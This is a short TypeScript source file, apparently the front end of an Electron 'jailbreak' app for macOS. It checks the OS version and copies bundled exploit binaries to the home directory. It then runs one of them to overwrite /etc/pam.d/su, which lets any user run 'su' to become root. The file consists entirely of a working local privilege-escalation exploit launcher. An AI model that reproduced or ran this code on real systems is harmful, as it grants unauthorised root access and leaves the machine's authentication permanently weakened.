const { exec } = require('child_process');
const btn = document.getElementById("jbbtn") as HTMLButtonElement;
const footnote = document.getElementById("footnote") as HTMLParagraphElement;
const path = require("path");
const os = require('os');
const fs = require('fs');
const homedir = os.homedir();
const appPath = __dirname.replace("/app.asar", "")

exec('sw_vers -productVersion', (error: any, stdout: string, stderr: any) => {
    if (error) {
        console.error(`exec error: ${error}`);
        return;
    }

    const osversion = stdout.trim();
    console.log("macOS version is "+osversion);
    if (osversion === "12.6.2" || osversion === "12.6.3" || osversion === "13.1" || osversion === "13.2" || osversion == "13.2.1") {
        btn.innerText = "unsupported";
        btn.style.backgroundColor = "#FF0000";
        btn.disabled = true;
        return;
    }
    footnote.innerHTML = "creating directory"
    if (!fs.existsSync(path.join(homedir,"ra1nm8"))){
        fs.mkdirSync(path.join(homedir,"ra1nm8"));
    };
    footnote.innerHTML = "copying exploit files"
    fs.copyFileSync(appPath+"/resources/exploit/switcharoo", path.join(homedir,"ra1nm8/switcharoo"));
    fs.copyFileSync(appPath+"/resources/exploit/overwrite_file.bin", path.join(homedir,"ra1nm8/overwrite_file.bin"))
    footnote.innerHTML = "waiting for jailbreak"
    btn.onclick = () => {
        footnote.innerHTML = "ensuring files"
        if (!fs.existsSync(path.join(homedir+"/ra1nm8/overwrite_file.bin")) || !fs.existsSync(path.join(homedir+"/ra1nm8/switcharoo"))){
            btn.innerText = "exploit failed";
            footnote.innerHTML = "one or multiple of the exploit files are missing. please re-run the app";
            btn.disabled = true;
            return;
        }
        btn.textContent = "jailbreaking";
        btn.disabled = true;
        btn.style.backgroundColor = "#FFC300";
        exec(path.join(homedir,"ra1nm8/switcharoo"+" /etc/pam.d/su "+path.join(homedir,"ra1nm8/overwrite_file.bin")), (error: any, stdout: any, stderr: any) => {
            if (error) {
                console.error(`exec error: ${error}`);
                if (stderr.includes("RO mapping was modified")){
                    btn.innerText = "jailbroken"
                    btn.style.backgroundColor = "#32e000"
                    btn.disabled = true
                    footnote.innerHTML = "successfully jailbroke macOS "+osversion+"! Run <strong><code>su</code></strong> in terminal to gain root."       
                } else if (stderr.includes("no diff?")){
                    btn.innerText = "jailbroken"
                    btn.style.backgroundColor = "#32e000"
                    btn.disabled = true
                    footnote.innerHTML = "successfully jailbroke macOS "+osversion+"! Run <strong><code>su</code></strong> in terminal to gain root."                  
                }
            }
        });
    };
});